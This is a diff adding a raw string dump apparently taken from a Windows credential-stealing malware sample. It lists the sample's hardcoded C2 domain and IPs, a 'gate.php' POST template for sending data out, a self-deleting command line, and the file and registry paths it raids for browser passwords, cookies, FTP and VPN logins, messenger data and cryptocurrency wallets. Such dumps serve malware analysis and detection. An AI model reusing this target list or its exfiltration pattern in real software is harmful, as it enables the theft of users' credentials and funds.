@@ -1,0 +1,235 @@
+0: http://bendes.co.uk
+1: /lmpUNlwDfoybeulu
+2: 4p81GSwBwRrAhCYK
+3: SQLite format 3
+4: 2|NordVPN||%s|%s
+
+
+5: 2|EarthVPN||%s|%s
+
+
+6: 3|Psi(+)|%s|%s|%s
+
+
+7: 3|Pidgin|%s|%s|%s
+
+
+8: 4|Remote Desktop|%s|%s|%s
+
+
+9: 1|TotalCommander|%s|%s|%s
+
+
+10: 1|WinSCP|%s|%s|%s
+
+
+11: 1|WS_FTP|%s|%s|%S
+
+
+12: 1|FileZilla|%s:%s|%s|%S
+
+
+13: full address:s:
+14: username:s:
+15: password 51:b:
+16: Path
+17: config
+18: name
+19: .bit
+20: %08lX%04lX%lu
+21: screenshot.png
+22: Hostname
+23: Username
+24: Password
+25: TRUE
+26: FALSE
+27: quit
+28: EarthVPN
+29: NordVPN
+30: setting[@name='%s']
+31: user.config
+32: Valve\Steam
+33: Telegram
+34: Battle.net
+35: Skype
+36: main.db
+37: loginusers
+38: discord\Local Storage\https_discordapp.com_0.localstorage
+39: .config
+40: \tdata\
+41: psi
+42: profiles
+43: %s\.purple\%s
+44: accounts.xml
+45: Software
+46: Microsoft
+47: Cryptography
+48: InstallPath
+49: ProductName
+50: DisplayIcon
+51: DisplayName
+52: DisplayVersion
+53: {53F49750-6209-4FBF-9CA8-7A333C87D1ED}_is1
+54: MachineGuid
+55: Martin Prikryl\WinSCP 2\Sessions
+56: Internet Explorer\IntelliForms\Storage2
+57: Internet Explorer\TypedURLs
+58: Windows\CurrentVersion\Uninstall
+59: Windows NT\CurrentVersion
+60: Windows\CurrentVersion\Uninstall
+61: Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles\Outlook
+62: Software\Microsoft\Office\%d.0\Outlook\Profiles\Outlook
+63: pstorec.dll
+64: vaultcli.dll
+65: Microsoft_WinInet_*
+66: abe2869f-9b47-4cd9-a358-c22904dba7f7
+67: B??K???A???JpM?(
+68: ?T?<??K?`???;U
+69: recentservers
+70: sitemanager
+71: FileZilla
+72: Host
+73: User
+74: Pass
+75: Ipswitch\WS_FTP\Sites\ws_ftp.ini
+76: ???????ixKZ-<4xV????
+77: GHISLER\wcx_ftp.ini
+78: 0123456789ABCDEF
+79: HostName
+80: UserName
+81: UID
+82: PWD
+83: Port
+84: connections
+85: encoding
+86: Internet Explorer
+87: Cookies
+88: wininet.txt
+89: %s	TRUE	%s	%s	%d	%s	%s
+
+
+90: Login Data
+91: %s\%S.json
+92: webappsstore.sqlite
+93: formhistory.sqlite
+94: signons.sqlite
+95: cookies.sqlite
+96: logins
+97: encryptedUsername
+98: encryptedPassword
+99: key3.db
+100: key4.db
+101: %s\key%d.db
+102: Web Data
+103: 176.126.70.119
+104: 46.101.70.183
+105: 188.165.200.156
+106: 103.25.202.192
+107: 178.32.31.41
+108: 82.196.9.45
+109: 87.98.175.85
+110: 185.121.177.53
+111: 92.222.80.28
+112: 185.121.177.177
+113: 169.239.202.202
+114: 80.233.248.109
+115: 78.138.97.93
+116: 91.217.137.44
+117: 5.135.183.146
+118: 51.15.98.97
+119: dotbit.me
+120: GET
+121: POST
+122: %S %s HTTP/1.1
+%SContent-Length: %d
+
+
+
+123: %S/gate.php
+124: Content-Type: application/x-www-form-urlencoded
+Host: %S
+
+
+125: Content-Type: application/octet-stream
+Content-Encoding: binary
+Host: %S
+
+
+126: Host: %S
+
+
+127: monero-project
+128: wallet_path
+129: wallet.dat
+130: Crypto
+131: keystore
+132: .wallet
+133: Ethereum
+134: Electrum
+135: Namecoin
+136: strDataDir
+137: com.liberty.jaxx\IndexedDB\file__0.indexeddb.leveldb\000003.log
+138: Exodus
+139: Grabber
+140: %FULLDISK%
+141: %NETWORK%
+142: /c ping 127.0.0.1 && del "%s"
+143: %02d-%02d-%02d %d:%02d:%02d
+144: MachineGuid: %S
+
+
+145: IP: %s
+
+
+146: CPU: %s (%d cores)
+
+
+147: RAM: %s MB
+
+
+148: Screen: %dx%d
+
+
+149: PC: %s
+User: %s
+
+
+150: LT: %s (UTC+%d:%d)
+
+
+151: GPU:
+
+
+152: Layouts: 
+153: Software: 
+
+
+154: PWD
+155: CRED_DATA
+156: CREDIT_CARD
+157: AUTOFILL_DATA
+158: IMPAUTOFILL_DATA
+159: SYSINFORMATION
+160: FFFILEE
+161: __DELIMM__
+162: __GRABBER__
+163: runas
+164: open
+165: %ComSpec%
+166: wininet.dll
+167: winhttp.dll
+168: ws2_32.dll
+169: user32.dll
+170: shell32.dll
+171: advapi32.dll
+172: dnsapi.dll
+173: netapi32.dll
+174: gdi32.dll
+175: gdiplus.dll
+176: oleaut32.dll
+177: ole32.dll
+178: shlwapi.dll
+179: userenv.dll
+180: urlmon.dll
+181: crypt32.dll
+182: mpr.dll
